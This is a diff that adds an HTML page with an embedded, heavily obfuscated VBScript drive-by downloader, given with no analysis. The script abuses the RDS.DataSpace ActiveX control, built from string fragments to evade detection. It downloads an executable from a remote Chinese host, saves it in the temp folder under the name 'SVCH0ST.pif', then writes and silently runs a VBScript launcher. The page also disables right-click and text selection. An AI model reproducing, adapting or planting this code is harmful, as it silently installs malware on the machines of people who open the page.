@@ -1,0 +1,78 @@
+/*
+*/
+<html>
+<body>
+</body>
+<script language=VBScript>
+On Error Resume Next
+cedanfaddressssssssss = "http://xj.dabb20s.net.cn/down/14.exe"
+cedanfobj="o"
+cedanfobjs="b"
+cedanfobjss="j"
+cedanfobjsss="e"
+cedanfobjssss="c"
+cedanfobjsssss="t"
+Set cedanf_2_cn = document.createElement(cedanfobj&cedanfobjs&cedanfobjss&cedanfobjsss&cedanfobjssss&cedanfobjsssss)
+cedanfid="clsid:"
+cedanfidx="BD"
+cedanfid2="96"
+cedanfid3="C5"
+cedanfid4="56-6"
+cedanfid5="5A"
+cedanfid6="3-1"
+cedanfid7="1D"
+cedanfid8="0-98"
+cedanfid9="3A-0"
+cedanfid10="0C0"
+cedanfid11="4FC"
+cedanfid12="29E"
+cedanfid13="36"
+cedanf3="Microsoft.X"
+cedanf4="MLHTTp"
+cedanf5="G"
+cedanf6="E"
+cedanf7="T"
+cedanfxml="M"&"i"&"c"&"r"&"osof"&"t.XM"&"LHTTp"
+cedanf_2_cn.SetAttribute "classid", cedanfid&cedanfidx&cedanfid2&cedanfid3&cedanfid4&cedanfid5&cedanfid6&cedanfid7&cedanfid8&cedanfid9&cedanfid10&cedanfid11&cedanfid12&cedanfid13
+Set cedanf_love=cedanf_2_cn.CreateObject(cedanfxml,"")
+cedanf_love.Open cedanf5&cedanf6&cedanf7, cedanfaddressssssssss, False
+cedanf_love.Send
+cedanf_kfqq_ssssssss="SVCH0ST.pif"
+cedanf_kfqq_sssssssss="SVCH0ST.vbs"
+mendfefefe="Scripting."
+mendfefefes="FileSyst"
+mendfefefess="emObject"
+mendfefefesss="Adod"
+mendfefefessss="b.stream"
+mendfefefesssss=mendfefefesss&mendfefefessss
+Set chilam = cedanf_2_cn.createobject(mendfefefe&mendfefefes&mendfefefess,"")
+Set yingying = chilam.GetSpecialFolder(2)
+cedanfuser="chilam"
+cedanf_kfqq_ssssssss=chilam.BuildPath(yingying,cedanf_kfqq_ssssssss)
+cedanf_kfqq_sssssssss=chilam.BuildPath(yingying,cedanf_kfqq_sssssssss)
+Set chilams = cedanf_2_cn.createobject(mendfefefesssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write cedanf_love.Responsebody
+chilams.Savetofile cedanf_kfqq_ssssssss,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'I LOVE cedanf TEAM"&"'I LOVE cedanf TEAM"&vbCrLf&"Set Love_cedanf_team = CreateObject(""Wscript"&".Shell"")"&"'I LOVE cedanf TEAM"&vbCrLf&"'I LOVE cedanf TEAM"&"'I LOVE cedanf TEAM"&vbCrLf&"Love_cedanf_team.run ("""&cedanf_kfqq_ssssssss&""")"&vbCrLf&"'I LOVE cedanf TEAM"&"'I LOVE cedanf TEAM"
+chilams.Savetofile cedanf_kfqq_sssssssss,2
+chilams.Close
+www="She"
+cute="ll.A"
+qq="ppl"
+cn="ica"
+kfqq="tion"
+Set cedanfsened = cedanf_2_cn.createobject(www&cute&qq&cn&kfqq, "")
+cedanfdk="O"
+cedanfdks="p"
+cedanfdkss="e"
+cedanfdksss="n"
+cedanfsened.Shellexecute cedanf_kfqq_sssssssss, "", "", cedanfdk&cedanfdks&cedanfdkss&cedanfdksss, 0
+</script>
+</html>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
